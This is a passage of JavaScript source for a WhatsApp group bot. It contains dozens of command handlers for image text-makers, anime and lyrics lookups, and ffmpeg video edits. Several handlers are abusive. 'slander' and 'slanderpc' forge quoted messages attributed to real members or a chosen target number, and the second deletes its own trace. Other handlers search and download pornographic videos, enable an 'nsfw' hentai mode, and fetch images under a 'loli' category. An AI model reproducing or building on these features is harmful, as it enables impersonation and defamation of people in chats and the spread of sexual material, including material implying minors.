              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
      
break
case 'writedown':
if (!c) return reply('Where is the text bro??')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `writelist`,buttonText:{displayText: `Write List🔖`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
     
break
case 'folioright':
if (!c) return reply('Where is the text bro??')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `writelist`,buttonText:{displayText: `Write List🔖`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
break
case 'xs':
if (!c) return reply('Looking for what?')
jackx = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideosearch?query=${c}&apikey=${HunterApi}`)
reply(mess.wait)
jackx = jackx.result
ini_txt = ""
for (var x of jackx) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}───────────────\n\n┌ ◪ *DOWNLOAD*
└ ${prefix}xvideo [link xvid] = Video`
xeon.sendMessage(from, anu, text, {quoted: mek})
break
case 'xvideo':
case 'xv': 
if (!c) return reply('the link?')
x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${c}&apikey=${HunterApi}`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
xeon.sendMessage(from, vid, video, {quoted: mek})
break
case 'writelist':
  reply(`Example ${prefix}write tes
  ▢ ${prefix}write jack
  ▢ ${prefix}folioright jack
  ▢ ${prefix}folioleft jack
  ▢ ${prefix}writedown jack
  ▢ ${prefix}writeleft jack`)
  break
case 'folioleft':
if (!c) return reply('Where is the text bro??')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `writelist`,buttonText:{displayText: `Write List🔖`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
break
case 'nsfw':
	        if (!isGroup) return reply('this feature is only for groups')
			if (!isOwner && !isGroupAdmins) return reply('only admin can use this feature')
					if (args.length < 1) return reply(`to activate type : ${prefix}nsfw 1`)
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('Already Activated')
						nsfww.push(from)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Successfully activated the nsfw feature')
						xeon.sendMessage(from, `Free to Find Hentai 🗿`, text)
					} else if (Number(args[0]) === 0) {
						if (!isNsfw) return reply('Its off')
						var ini = nsfww.indexOf(from)
						nsfww.splice(ini, 1)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Successfully disable the nsfw feature')
					} else {
						reply('1 to turn on, 0 to turn off')
					}
					break

			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'googletxt2':
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa|chan|kawai`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					ll3 = makell.split("|")[0];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'battlefield': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack|Doge`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'neon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
              case 'glow': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'summer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'flower': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'burn': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
buttons = [{buttonId: `quote`,buttonText:{displayText: `Thx Dah Pake`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
					break
			case 'wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} jack`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					xeon.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
case 'vnsecond':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await xeon.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						xeon.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:fvn})
						fs.unlinkSync(mediam)
				break
				case 'vidsecond':
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await xeon.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						xeon.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: fvid})
						fs.unlinkSync(median)
				break
      case "colongsw": //arif
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await xeon.downloadAndSaveMediaMessage(ger);
          xeon.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Success");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await xeon.downloadAndSaveMediaMessage(ger);
          xeon.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Success");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply to the photo / video that you want to help");
        }
        break;

      case "caripesan":
        if (!q) return reply("whats the message?");
        let v = await xeon.searchMessages(q, from, 10, 1);
        let s = v.messages;
        let el = s.filter((v) => v.message);
        el.shift();
        try {
          if (el[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await xeon.sendMessage(from, "Here is the message", text, {
              quoted: el[i],
            });
          }
         } catch (e) {
          reply("Message not found!");
        }
        break;
      case "lyrics":
        if (!q) return reply("What song is it?");
        let song = await hx.lirik(q);
        sendMediaURL(from, song.thumb, song.lirik);
        break;
      case "otaku":
        if (!q) return reply("anime title?");
        let anime = await hx.otakudesu(q);
        rem = `*Title* : ${anime.judul}
*Japan* : ${anime.jepang}
*Rating* : ${anime.rate}
*Producer* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Duration* : ${anime.durasi}
*Release* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Synopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`;
        ram = await getBuffer(anime.img);
        xeon.sendMessage(from, ram, image, { quoted: mek, caption: rem });
        break;
      case "comic":
        if (!q) return reply(`judulnya?\n${prefix}comic dont want to`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Early Chapter* : ${komik.chapter_awal}
*Final Chapter* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
        break;
      case "chara":
        if (!q) return reply(`gambar apa?\n${prefix}chara xeon`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await xeon.sendMessage(from, li, image, { quoted: mek });
        break;
      case 'pinterest':
        /*if (!q) return reply("gambar apa?");*/
        reply(mess.wait)
        let pin = await hx.pinterest(q);
        let ac = pin[Math.floor(Math.random() * pin.length)];
        let di = await getBuffer(ac);
buttons = [{buttonId: `pinterest`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(di, "imageMessage", { thumbnail: di, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
        break;
      case "playstore":
        if (!q) return reply("what are you looking for?");
        let play = await hx.playstore(q);
        let store = "❉─────────────────────❉\n";
        for (let i of play) {
          store += `\n*「 _PLAY STORE_ 」*\n
- *Name* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`;
        }
        reply(store);
        break;
      case "on":
        if (!mek.key.fromMe) return;
        offline = false;
        fakestatus(" ```ANDA TELAH ONLINE``` ");
        break;
      case "status":
        fakestatus(
          `╭─➤ *𝐏𝐄𝐏𝐄 𝐒𝐈𝐑*\n│       ❑  *BOT STATUS*\n│❖  ${offline ? " ᴏɴʟɪɴᴇ" : " ᴏғғʟɪɴᴇ"}\n│❖  ${banChats ? " sᴇʟғ ᴍᴏᴅᴇ" : " ᴘᴜʙʟɪᴄ ᴍᴏᴅᴇ" }\n│❖  ${prefixStatus ? " ᴍᴜʟᴛɪ ᴘʀᴇғɪx" : " ɴᴏ ᴘʀᴇғɪx"}\n╰────────────────❋ཻུ۪۪⸙\n\n⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘\n             ᴘᴇᴘᴇ sɪʀ\n\n╭◪ *ᴄᴏᴅᴅᴇᴅ ʙʏ ᴘᴇᴘᴇ*\n╰─────────────────❋ཻུ۪۪⸙`
        );
        break;
      case "off":
        if (!mek.key.fromMe) return;
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        fakestatus(" ```YOU ARE OFFLINE``` ");
        break;
      case "get":
        if (!q) return reply("The link?");
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            fakestatus(bu);
          });
        break;
      case "contag":
        if (!mek.key.fromMe) return reply("This feature is only for the owner 🗿");
        pe = args.join("");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        xeon.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case "sticktag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await xeon.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await xeon.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          xeon.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker that has been sent*`);
        }
        break;
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await xeon.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await xeon.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          xeon.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await xeon.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await xeon.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          xeon.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await xeon.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await xeon.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          xeon.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await xeon.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await xeon.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          xeon.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "slander":
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}slander [@tag|message|replybot]]\n\nEx : \n${prefix}slander @tagmember|hi|hi too`
          );
        var gh = args.join("");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split("|")[0];
        var target = gh.split("|")[1];
        var bot = gh.split("|")[2];
        xeon.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case "settarget":
        if (!q) return reply(`${prefix}settarget 919xxxxx`);
        targetpc = args[0];
        fakegroup(`Success Changing the target of slanderpc : ${targetpc}`);
        break;
      case "slanderpc":
        if (!q) return reply(`${prefix}slanderpc target text|your text`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(" ").replace(/@|\d/gi, "").split("|");
        var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        const responye = await xeon.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await xeon.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;
      case "tomp3":
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await xeon.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          xeon.sendMessage(from, buffer453, audio, {
            mimetype: "audio/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
      case "fast":
        if (!isQuotedVideo) return fakegroup("Reply video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await xeon.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            xeon.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "slow":
        if (!isQuotedVideo) return fakegroup("Reply video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await xeon.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            xeon.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "reverse":
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await xeon.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          xeon.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
  case 'buttons5':
              const mathdare = dare[Math.floor(Math.random() * (dare.length))]
              result = `${mathdare}`
              buttons = [{buttonId: `buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`buttons5`,buttonText:{displayText:'Dare'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Play again?', buttons: buttons, headerType: 1 }
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{})
              xeon.relayWAMessage(prep)
              break
          case 'buttons6':
              const randomtruth = truth[Math.floor(Math.random() * truth.length)]
              result = `${randomtruth}`
              buttons = [{buttonId: `buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Play again?', buttons: buttons, headerType: 1 }
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{})
              xeon.relayWAMessage(prep)
              break
          case 'tod':
          case 'truth':
          case 'dare':
              result =`*Truth Or Dare*\nPlayers are given a choice between answering questions honestly, or taking on the challenge given`
              buttons = [{buttonId: `buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`buttons5`,buttonText:{displayText:'Dare'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Truth or Dare?', buttons: buttons, headerType: 1 }
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{contextInfo: { mentionedJid: [sender]},quoted:ftex})
              xeon.relayWAMessage(prep)
              break
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                xeon.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "Here",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case 'calculator':
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
	
				case 'nointext':
				if (args.length < 1) return reply('The numbers?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
			
  	case 'artinama':	
  	  reply(mess.wait)
  rival = await fetchJson(`https://bx-hunter.herokuapp.com/api/artinama?nama=${args[0]}&apikey=${HunterApi}`, {method:'get'})
  slur = rival.result
   reply(slur)
   break
case 'waifu':
          case 'loli':
          case 'husbu':
          case 'milf':
          case 'cosplay':
          case 'wallml':
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
